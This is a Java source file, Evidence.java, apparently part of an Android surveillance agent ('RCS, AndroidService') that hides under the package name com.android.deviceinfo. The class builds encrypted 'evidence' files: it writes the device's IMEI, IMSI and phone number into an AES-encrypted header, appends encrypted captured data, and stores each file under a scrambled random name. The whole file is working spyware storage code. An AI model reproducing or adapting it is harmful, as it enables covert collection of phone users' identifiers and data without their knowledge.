/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Evidence.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.evidence;

import java.util.ArrayList;
import java.util.Date;

import com.android.deviceinfo.Device;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.Configuration;
import com.android.deviceinfo.crypto.Encryption;
import com.android.deviceinfo.crypto.Keys;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.DataBuffer;
import com.android.deviceinfo.util.DateTime;
import com.android.deviceinfo.util.WChar;

/**
 * The Class Evidence (formerly known as Log.)
 */
final class Evidence {

	/** The Constant EVIDENCE_VERSION_01. */
	private static final int E_VERSION_01 = 2008121901;

	/** The Constant TAG. */
	private static final String TAG = "Evidence"; //$NON-NLS-1$
	/** The first space. */
	boolean firstSpace = true;

	/** The enough space. */
	boolean enoughSpace = true;

	/** The timestamp. */
	Date timestamp;

	/** The log name. */
	String logName;

	/** The evidence type. */
	int evidenceType;

	/** The file name. */
	String fileName;

	/** The fconn. */
	AutoFile fconn = null;

	// DataOutputStream os = null;
	/** The encryption. */
	Encryption encryption;

	/** The evidence collector. */
	EvidenceCollector evidenceCollector;

	/** The evidence description. */
	EvidenceDescription evidenceDescription;

	/** The device. */
	Device device;

	/** The type evidence id. */
	int typeEvidenceId;

	/** The progressive. */
	int progressive;

	/** The aes key. */
	private byte[] aesKey;

	/** The enc data. */
	private byte[] encData;

	private byte[] lastBlock;

	/**
	 * Instantiates a new evidence.
	 */
	private Evidence() {
		evidenceCollector = EvidenceCollector.self();
		device = Device.self();

		progressive = -1;
		timestamp = new Date();

	}

	/**
	 * Instantiates a new log.
	 * 
	 * @param typeEvidenceId
	 *            the type evidence id
	 * @param aesKey
	 *            the aes key
	 */
	public Evidence(final int typeEvidenceId, final byte[] aesKey) {
		this();
		if (Cfg.DEBUG) {
			Check.requires(aesKey != null, "aesKey null"); //$NON-NLS-1$
		}
		// agent = agent_;
		this.typeEvidenceId = typeEvidenceId;
		this.aesKey = aesKey;

		encryption = new Encryption(aesKey);
		lastBlock = new byte[encryption.getBlockSize()];

		// if(Cfg.DEBUG) Check.ensures(agent != null, "createLog: agent null"); //$NON-NLS-1$
		if (Cfg.DEBUG) {
			Check.ensures(encryption != null, "encryption null"); //$NON-NLS-1$
		}
	}

	/**
	 * Instantiates a new evidence.
	 * 
	 * @param typeEvidenceId
	 *            the type evidence id
	 */
	public Evidence(final int typeEvidenceId) {
		this(typeEvidenceId, Keys.self().getAesKey());
	}

	/**
	 * Enough space.
	 * 
	 * @return true, if successful
	 */
	private boolean enoughSpace() {
		long free = 0;

		free = Path.freeSpace();

		if (free < Configuration.MIN_AVAILABLE_SIZE) {
			if (firstSpace) {
				firstSpace = false;

				if (Cfg.DEBUG) {
					Check.log(TAG + " FATAL: not enough space. Free : " + free);//$NON-NLS-1$
				}
			}
			return false;
		} else {
			return true;
		}
	}

	/**
	 * Chiude il file di log. Torna TRUE se il file e' stato chiuso con
	 * successo, FALSE altrimenti. Se bRemove e' impostato a TRUE il file viene
	 * anche cancellato da disco e rimosso dalla coda. Questa funzione NON va
	 * chiamata per i markup perche' la WriteMarkup() e la ReadMarkup() chiudono
	 * automaticamente l'handle.
	 * 
	 * @return true, if successful
	 */
	public synchronized boolean close() {
		boolean ret = false;

		if (fconn != null && fconn.exists()) {
			if (Cfg.DEBUG) {
				// Check.log(TAG + " (close): " +
				// EvidenceCollector.decryptName(fconn.getName()));
			}
			ret = fconn.dropExtension(EvidenceCollector.LOG_TMP);
			if (!ret) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " ERROR (close): cannot dropExtension");
				}
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (close): fconn == null || !fconn.exists()");
			}
		}

		if (Cfg.DEMO) {
			// Beep.bip();
		}

		encData = null;
		fconn = null;
		return ret;
	}

	/**
	 * Crea un'evidenza con tipo standard.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @return true, if successful
	 */
	public synchronized boolean createEvidence(final byte[] additionalData) {
		return createEvidence(additionalData, typeEvidenceId);
	}

	/**
	 * Questa funzione crea un file di log e lascia l'handle aperto. Il file
	 * viene creato con un nome casuale, la chiamata scrive l'header nel file e
	 * poi i dati addizionali se ce ne sono. LogType e' il tipo di log che
	 * stiamo scrivendo, pAdditionalData e' un puntatore agli eventuali
	 * additional data e uAdditionalLen e la lunghezza dei dati addizionali da
	 * scrivere nell'header. Il parametro facoltativo bStoreToMMC se settato a
	 * TRUE fa in modo che il log venga salvato nella prima MMC disponibile, se
	 * non c'e' la chiama fallisce. La funzione torna TRUE se va a buon fine,
	 * FALSE altrimenti.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param evidenceType
	 *            the log type
	 * @return true, if successful
	 */
	public synchronized boolean createEvidence(final byte[] additionalData, final int evidenceType) {

		this.typeEvidenceId = evidenceType;
		if (Cfg.DEBUG) {
			Check.requires(fconn == null, "createLog: not previously closed"); //$NON-NLS-1$
		}
		timestamp = new Date();

		int additionalLen = 0;

		if (additionalData != null) {
			additionalLen = additionalData.length;
		}

		enoughSpace = enoughSpace();
		if (!enoughSpace) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " createEvidence, no space");//$NON-NLS-1$
			}
			return false;
		}

		final Name name = evidenceCollector.makeNewName(this, EvidenceType.getMemo(evidenceType));

		progressive = name.progressive;

		final String dir = name.basePath + name.blockDir + "/"; //$NON-NLS-1$
		final boolean ret = Path.createDirectory(dir);

		if (!ret) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: Dir not created: " + dir);//$NON-NLS-1$
			}
			return false;
		}

		fileName = dir + name.encName + EvidenceCollector.LOG_TMP;
		if (Cfg.DEBUG) {
			Check.asserts(fileName != null, "null fileName"); //$NON-NLS-1$
		}
		// if(Cfg.DEBUG)
		// Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP), //$NON-NLS-1$
		// "file not scrambled");
		// if(Cfg.DEBUG) Check.asserts(!fileName.endsWith("MOB"), //$NON-NLS-1$
		// "file not scrambled");
		try {
			fconn = new AutoFile(fileName);

			if (fconn.exists()) {
				close();
				if (Cfg.DEBUG) {
					Check.log(TAG + " FATAL: It should not exist:" + fileName);//$NON-NLS-1$
				}
				return false;
			}
			if (Cfg.DEBUG) {
				//Check.log(TAG + " Created " + evidenceType + " : " + name.fileName);//$NON-NLS-1$ //$NON-NLS-2$
			}
			final byte[] plainBuffer = makeDescription(additionalData, evidenceType);
			if (Cfg.DEBUG) {
				Check.asserts(plainBuffer.length >= 32 + additionalLen, "Short plainBuffer"); //$NON-NLS-1$
			}

			final byte[] encBuffer = encryption.encryptData(plainBuffer);
			if (Cfg.DEBUG) {
				Check.asserts(encBuffer.length == encryption.getNextMultiple(plainBuffer.length), "Wrong encBuffer"); //$NON-NLS-1$
			}
			// scriviamo la dimensione dell'header paddato
			fconn.write(ByteArray.intToByteArray(plainBuffer.length));
			// scrittura dell'header cifrato
			fconn.append(encBuffer);
			if (Cfg.DEBUG) {
				Check.asserts(fconn.getSize() == encBuffer.length + 4, "Wrong filesize"); //$NON-NLS-1$
				// if(AutoConfig.DEBUG) Check.log( TAG  ;//$NON-NLS-1$
				// " additionalData.length: "
				// +
				// plainBuffer.length);
				// if(AutoConfig.DEBUG) Check.log( TAG + " encBuffer.length: "  ;//$NON-NLS-1$
				// encBuffer.length);
			}
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: file: " + name.fileName + " ex:" + ex);//$NON-NLS-1$ //$NON-NLS-2$
			}
			return false;
		}

		return true;
	}

	// pubblico solo per fare i test
	/**
	 * Make description.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param evidenceType
	 *            the log type
	 * @return the byte[]
	 */
	public byte[] makeDescription(final byte[] additionalData, final int evidenceType) {

		if (timestamp == null) {
			timestamp = new Date();
		}

		int additionalLen = 0;

		if (additionalData != null) {
			additionalLen = additionalData.length;
		}

		final DateTime datetime = new DateTime();

		if (Cfg.DEBUG) {
			final DateTime dt = new DateTime(datetime.getDate());
			boolean hitest = dt.hiDateTime() == datetime.hiDateTime();
			boolean lowtest = dt.lowDateTime() == datetime.lowDateTime();
			//Check.log(dt + " ticks: " + dt.getTicks());
			Check.asserts(hitest, "hi test");
			Check.asserts(lowtest, "low test");
		}

		evidenceDescription = new EvidenceDescription();
		evidenceDescription.version = E_VERSION_01;
		evidenceDescription.logType = evidenceType;
		evidenceDescription.hTimeStamp = datetime.hiDateTime();
		evidenceDescription.lTimeStamp = datetime.lowDateTime();
		evidenceDescription.additionalData = additionalLen;
		evidenceDescription.deviceIdLen = WChar.getBytes(device.getImei()).length;
		evidenceDescription.userIdLen = WChar.getBytes(device.getImsi()).length;
		evidenceDescription.sourceIdLen = WChar.getBytes(device.getPhoneNumber()).length;

		final byte[] baseHeader = evidenceDescription.getBytes();
		if (Cfg.DEBUG) {
			Check.asserts(baseHeader.length == evidenceDescription.length, "Wrong log len"); //$NON-NLS-1$
		}
		final int headerLen = baseHeader.length + evidenceDescription.additionalData + evidenceDescription.deviceIdLen
				+ evidenceDescription.userIdLen + evidenceDescription.sourceIdLen;
		final byte[] plainBuffer = new byte[encryption.getNextMultiple(headerLen)];

		final DataBuffer databuffer = new DataBuffer(plainBuffer, 0, plainBuffer.length);
		databuffer.write(baseHeader);
		databuffer.write(WChar.getBytes(device.getImei()));
		databuffer.write(WChar.getBytes(device.getImsi()));
		databuffer.write(WChar.getBytes(device.getPhoneNumber()));

		if (additionalLen > 0) {
			databuffer.write(additionalData);
		}

		return plainBuffer;
	}

	/**
	 * Write evidence.
	 * 
	 * @param data
	 *            the data
	 * @return true, if successful
	 */
	public boolean writeEvidence(final byte[] data) {
		return writeEvidence(data, 0, data.length);
	}

	/**
	 * Questa funzione prende i byte puntati da pByte, li cifra e li scrive nel
	 * file di log creato con CreateLog(). La funzione torna TRUE se va a buon
	 * fine, FALSE altrimenti.
	 * 
	 * @param data
	 *            the data
	 * @param offset
	 *            the offset
	 * @return true, if successful
	 */
	public synchronized boolean writeEvidence(final byte[] data, final int offset, int len) {
		if (Cfg.DEBUG) {
			// Check.log(TAG + " (writeEvidence) len: " + data.length +
			// " offset: " + offset);
		}

		if (!enoughSpace) {
			return false;
		}

		if (offset >= data.length) {
			return false;
		}

		encData = encryption.encryptData(data, offset, len);

		if (fconn == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: fconn null");//$NON-NLS-1$
			}
			return false;
		}

		try {
			fconn.append(ByteArray.intToByteArray(data.length - offset));
			fconn.append(encData);

		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: Error writing file: " + e);//$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	/**
	 * Write logs.
	 * 
	 * @param bytelist
	 *            the bytelist
	 * @return true, if successful
	 */
	public boolean writeEvidences(final ArrayList<byte[]> byteList) {

		int totalLen = 0;
		for (byte[] bs : byteList) {
			totalLen += bs.length;
		}

		final int offset = 0;
		final byte[] buffer = new byte[totalLen];
		final DataBuffer databuffer = new DataBuffer(buffer, 0, totalLen);

		for (byte[] bs : byteList) {
			databuffer.write(bs);
		}

		return writeEvidence(buffer);
	}

	public boolean appendEvidence(byte[] data, int offset, int len) {
		if (Cfg.DEBUG) {
			// Check.log(TAG + " (writeEvidence) len: " + data.length +
			// " offset: " + offset);
		}

		if (!enoughSpace) {
			return false;
		}

		if (fconn == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: fconn null");//$NON-NLS-1$
			}
			return false;
		}

		try {
			if (data == null) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (appendEvidence) just the size");
				}
				fconn.append(ByteArray.intToByteArray(len));
			} else {
				if (offset >= data.length) {
					return false;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (appendEvidence) append block");
				}
				encData = encryption.appendData(data, offset, len, lastBlock);
				fconn.append(encData);
			}

		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: Error writing file: " + e);//$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	/**
	 * Gets the enc data.
	 * 
	 * @return the enc data
	 */
	public byte[] getEncData() {
		return encData;
	}

	/**
	 * Atomic write once.
	 * 
	 * @param additionalData
	 *            the additional data
	 * @param logType
	 *            the log type
	 * @param content
	 *            the content
	 */
	public void atomicWriteOnce(final byte[] additionalData, final int logType, final byte[] content) {
		if (createEvidence(additionalData, logType)) {
			writeEvidence(content);
			if (Cfg.DEBUG) {
				Check.ensures(getEncData().length % 16 == 0, "wrong len"); //$NON-NLS-1$
			}
			close();
		}
	}

	public void atomicWriteOnce(ArrayList<byte[]> byteList) {
		createEvidence(null);
		writeEvidences(byteList);
		close();
	}

	public void atomicWriteOnce(byte[] content) {
		createEvidence(null);
		writeEvidence(content);
		close();
	}

	@Override
	public String toString() {
		if (Cfg.DEBUG) {
			return "Evidence " + progressive;
		} else {
			return Integer.toString(progressive);
		}
	}

}
